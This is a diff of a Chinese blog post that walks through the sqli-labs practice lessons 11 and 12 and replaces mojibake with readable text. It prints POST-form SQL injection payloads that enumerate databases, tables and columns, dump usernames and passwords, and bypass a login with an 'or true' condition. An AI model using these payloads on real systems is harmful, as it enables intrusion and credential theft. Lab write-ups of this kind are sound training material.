@@ -19,15 +19,15 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="sql-labs-less11��ǰctf��ϰ�ⷴ����postģʽ���Ķ�Щ��notice  ע��ԭ�������ֵҪ��Ϊ���ݿⲻ���ڵ�ֵ��ý�����Ĳ�ѯ�������    hackbar�µĽṹ 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit ֮���ע��ƴ�ӽ�">
+    <meta name="description" content="sql-labs-less11以前ctf练习题反而是post模式做的多些，notice  注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖    hackbar下的结构 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit 之后的注入拼接进uname后   爆用户和库名： 11&amp;#x27">
 <meta property="og:type" content="article">
 <meta property="og:title" content="note-07">
 <meta property="og:url" content="http://example.com/2025/03/06/note-07/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="sql-labs-less11��ǰctf��ϰ�ⷴ����postģʽ���Ķ�Щ��notice  ע��ԭ�������ֵҪ��Ϊ���ݿⲻ���ڵ�ֵ��ý�����Ĳ�ѯ�������    hackbar�µĽṹ 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit ֮���ע��ƴ�ӽ�">
+<meta property="og:description" content="sql-labs-less11以前ctf练习题反而是post模式做的多些，notice  注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖    hackbar下的结构 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit 之后的注入拼接进uname后   爆用户和库名： 11&amp;#x27">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-06T13:08:00.000Z">
-<meta property="article:modified_time" content="2025-03-06T13:37:45.551Z">
+<meta property="article:modified_time" content="2025-03-06T13:38:03.560Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary_large_image">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          81 字
+          187 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          1 分钟
+          2 分钟
         
       </span>
     
@@ -276,28 +276,28 @@
             
               <div class="markdown-body">
                 
-                <h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>��ǰctf��ϰ�ⷴ����postģʽ���Ķ�Щ��<br>notice</p>
+                <h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>以前ctf练习题反而是post模式做的多些，<br>notice</p>
 <blockquote>
-<p>ע��ԭ�������ֵҪ��Ϊ���ݿⲻ���ڵ�ֵ��ý�����Ĳ�ѯ�������  </p>
+<p>注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖  </p>
 </blockquote>
-<p>hackbar�µĽṹ</p>
+<p>hackbar下的结构</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure>
-<p>֮���ע��ƴ�ӽ�uname��  </p>
-<p>���û��Ϳ�����</p>
+<p>之后的注入拼接进uname后  </p>
+<p>爆用户和库名：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure>
-<p>��������</p>
+<p>爆表名：</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
-<p>���ֶΣ�</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>����<span class="hljs-keyword">and</span>����Ļ��������������ͬ�����µ��ֶα�����<br></code></pre></td></tr></table></figure>
-<p>��󱬿⣺</p>
+<p>爆字段：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>不加<span class="hljs-keyword">and</span>后面的话好像会把其它库的同名表下的字段爆出来<br></code></pre></td></tr></table></figure>
+<p>最后爆库：</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
-<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>Ӧ���Ǽ��˼�飬password����Ϊ��</p>
+<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>应该是加了检查，password不能为空</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
-<p>����  </p>
+<p>回显  </p>
 <blockquote>
 <p>Your Login name:Dumb<br>Your Password:Dumb  </p>
 </blockquote>
-<p>�ɹ��պ�sql��ѯ,Ȼ��������ͨ�ء�</p>
+<p>成功闭合sql查询,然后走流程通关。</p>
 
                 
               </div>
